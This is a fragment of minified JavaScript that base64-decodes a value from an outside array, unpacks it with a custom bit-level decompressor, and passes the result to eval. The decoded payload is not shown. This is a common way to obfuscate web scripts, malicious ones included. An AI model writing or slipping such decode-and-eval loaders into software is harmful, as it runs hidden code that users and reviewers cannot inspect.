r=atob(_[1]);
for(var J,S,P,A,C,K=function(r)
	{
	s+=String.fromCharCode(r)
}
,E=function(i)
	{
	return r.charCodeAt(i||h++)
}
,R=function()
	{
	g||(C=h++);
	var r=E(C)&u[g]?1:0;
	return g=g+1&7,r
}
,X=function(r)
	{
	for(var i=0,f=0,n=r-1;
	i++<r;
	)f+=R()*m[n--];
	return f
}
,t=function(r)
	{
	for(var i=r[0],f=0,n=r.length,o=1;
	o<n;
	)
		{
		if(R())return X(i)+f;
		f+=m[i],i=r[o++]
	}
	return X(i)+f
}
,d=function(r,f,n)
	{
	for(i=0;
	i<r;
	)f[i++]=X(n)+1
}
,s="",g=h=q=0,i=256,p=(E()*i+E())*i+E(),u=[],m=[],o=[];
i>>=1;
)u.push(i);
for(i++;
32767&i;
)m.push(i),i<<=1;
for(A=E(),i=0;
i<A;
)o[i++]=E();
for(d(X(3)+1,w=[],3),d(X(3)+1,x=[],4),d(X(3)+1,y=[],4);
q<p;
)if(i)
	{
	for(J=q+t(x);
	q<=J;
	)q++<p&&K(o[t(w)]);
	i=0
}
else for(i=R(),P=(S=q-t(y))+t(x)+4;
S<P;
q++)K(s.charCodeAt(S++));
eval(s)
